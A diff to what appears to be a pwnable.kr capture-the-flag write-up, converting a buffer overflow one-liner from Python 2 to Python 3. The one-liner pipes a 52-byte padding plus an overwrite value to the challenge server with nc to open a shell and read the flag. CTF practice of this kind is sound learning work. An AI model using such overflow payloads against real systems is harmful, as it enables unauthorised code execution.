@@ -50,5 +50,5 @@ As seen above, we can see the input data as 0x42424141 0x44444343.Hence we need 
 
 Along with the script, challange can be solved with the following one-liner as well. After shell is opened, ```cat flag``` to get the flag
 ```
-(python -c 'print("A"*52 + "\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000
+(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000
 ```
